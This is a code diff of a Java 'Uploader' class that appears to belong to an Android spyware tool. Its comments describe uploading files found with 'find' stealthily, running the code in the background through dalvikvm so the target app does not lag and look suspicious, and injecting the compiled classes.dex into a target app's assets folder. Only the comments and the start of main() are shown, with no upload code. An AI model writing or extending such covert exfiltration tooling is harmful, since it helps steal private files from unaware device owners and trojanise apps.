@@ -11,13 +11,20 @@ public class Uploader {
 	 What to do in this class: 
 	 get result list from 'find' command, then upload file(s) stealthily (No foreground delay)
          
+	 Benefit of using dalvikvm to run codes:
+	 Android app is run under single thread, too much code injected will make the app pauses/lags. 
+	 Shell command, "dalvikvm" Make your program run in background, avoid making the target app laggy, making it suspicious.
+	 
+	 What shouldn't be written in this program:
+	 Needs Android libraries (I didn't test, but I guess adding all Android libraries(.jar) to this program is impossible ;/)
+	 
          How to use this class:
-         Easiest way is to find an android ide like AIDE or Java N-IDE, add required libraries.
-         Then compile it. Go to ouput folder, find "classes.dex", copy it to target app's assets folder.
-
-	 */
+         Easiest way is to find an android ide like AIDE or Java N-IDE, add required libraries, copy and paste this program.
+         Then compile it. Go to ouput/relase folder in your project, find "classes.dex", copy it to target app's assets folder.
+	 
+	*/
     public static void main(String[] args) {
-        //get result path list's file path
+        //parameter args[0]: name of the file [a list of paths (the target file's locations)]
         File f = new File(args[0]);
         try
         {
